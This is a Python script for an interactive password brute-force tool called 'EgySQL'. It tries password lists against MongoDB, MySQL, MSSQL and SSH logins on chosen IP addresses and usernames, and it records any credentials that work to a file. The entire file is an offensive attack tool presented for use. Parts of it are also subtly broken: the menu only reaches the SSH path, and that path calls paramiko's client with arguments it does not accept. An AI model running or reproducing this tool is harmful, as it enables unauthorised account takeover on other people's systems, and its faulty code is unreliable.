import socket
import paramiko
import pymysql
import pymongo
import pyodbc
import getpass

SERVICES = {
    '1': ('MongoDB', pymongo.MongoClient, 27017),
    '2': ('MySQL', pymysql.connect, 3306),
    '3': ('MSSQL', pyodbc.connect, 1433),
    '4': ('SQLite', None, 0),  # Placeholder for future implementation
    '5': ('SSH', paramiko.SSHClient, 22),
    '6': ('FTP', None, 21),  # Placeholder for future implementation
}

def check_port_open(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except (socket.timeout, ConnectionRefusedError):
        return False

def read_passwords_from_file(password_list_path):
    try:
        with open(password_list_path) as f:
            return f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Error: Password list file '{password_list_path}' not found.")
        return None

def save_successful_attempt(service, host, username, password):
    with open("successful_attempts.txt", "a") as f:
        f.write(f"Service: {service}, Host: {host}, Username: {username}, Password: {password}\n")

def execute_bruteforce(service, host, username, password):
    try:
        client, client_port = SERVICES[service][1], SERVICES[service][2]
        if client is None:
            raise NotImplementedError(f"{SERVICES[service][0]} bruteforce is not implemented yet.")

        if not check_port_open(host, client_port):
            return False

        connection_params = {
            'host': host,
            'port': client_port,
            'user': username,
            'password': password,
            'timeout': 2
        }
        
        with client(**connection_params) as conn:
            if service == '1':  # MongoDB
                databases = conn.list_database_names()
            elif service == '2':  # MySQL
                cursor = conn.cursor()
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                cursor.close()
            elif service == '3':  # MSSQL
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM master.dbo.sysdatabases")
                databases = cursor.fetchall()
                cursor.close()

            # Save successful attempt to the text file
            save_successful_attempt(SERVICES[service][0], host, username, password)

            return True

    except paramiko.ssh_exception.NoValidConnectionsError:
        return False
    except paramiko.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        return False
    except pymysql.MySQLError:
        return False
    except pymongo.errors.ServerSelectionTimeoutError:
        return False
    except pyodbc.Error:
        return False
    except Exception as e:
        return False

def bruteforce_service(service, host, username, password_list, verbose=True):
    if not password_list:
        print("[-] Error: No passwords provided.")
        return

    if not check_port_open(host, SERVICES[service][2]):
        print(f"[-] Failed to connect to {host}:{SERVICES[service][2]}. Make sure the service is running.")
        return

    for password in password_list:
        success = execute_bruteforce(service, host, username, password)
        if success:
            print(f"[+] Successfully logged in with credentials: {username}:{password}")
            # Save only the first successful attempt and then exit the loop
            break
        elif verbose:
            print(f"[-] Login failed with credentials: {username}:{password}")

    else:
        print("[!] Brute force attempt unsuccessful. Password not found.")

def welcome_message():
    print("Welcome to EgySQL - The Ultimate Multi-Service Brute Force Tool")
    print("AliElTop 2.0")

def get_ips_or_users_from_list(is_ip=True):
    item_name = "IP" if is_ip else "User"
    items = input(f"Enter {item_name}s (comma-separated): ").split(',')
    return items

def bruteforce_ip(ip):
    print(f"[*] Starting bruteforce for IP: {ip}...")
    username = input("Enter the target username: ")
    password_list_path = input("Enter the password list file path: ")
    password_list = read_passwords_from_file(password_list_path)
    bruteforce_service('5', ip, username, password_list)

def bruteforce_user(user):
    print(f"[*] Starting bruteforce for User: {user}...")
    ip = input("Enter the target IP: ")
    password_list_path = input("Enter the password list file path: ")
    password_list = read_passwords_from_file(password_list_path)
    bruteforce_service('5', ip, user, password_list)

def main():
    welcome_message()

    while True:
        print("\nChoose an option:")
        print("1. Scan a single IP")
        print("2. Scan multiple IPs from list")
        print("3. Scan a single user")
        print("4. Scan multiple users from list")
        print("Q. Quit")

        choice = input("Enter your choice: ")

        if choice == '1':
            ip = input("Enter the target IP: ")
            bruteforce_ip(ip)
        elif choice == '2':
            ips = get_ips_or_users_from_list(is_ip=True)
            for ip in ips:
                bruteforce_ip(ip)
        elif choice == '3':
            user = input("Enter the target username: ")
            bruteforce_user(user)
        elif choice == '4':
            users = get_ips_or_users_from_list(is_ip=False)
            for user in users:
                bruteforce_user(user)
        elif choice.lower() == 'q':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Try again...")

if __name__ == "__main__":
    main()
